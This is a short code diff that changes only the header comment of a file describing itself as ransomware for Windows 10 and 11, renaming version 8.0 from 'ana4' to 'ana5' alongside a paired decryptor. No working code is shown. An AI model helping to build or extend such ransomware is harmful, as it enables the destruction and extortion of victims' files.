@@ -1,5 +1,5 @@
 #  This is a ransomware that is designed for windows 10 & 11 made to corrupt targeted files and programs as admin,
-#  this is the version 8.0 called ana4 and it is paired with the decryption software lana5, this malware
+#  this is the version 8.0 called ana5 and it is paired with the decryption software lana5, this malware
 #  is designed to work in the following way:
 
 
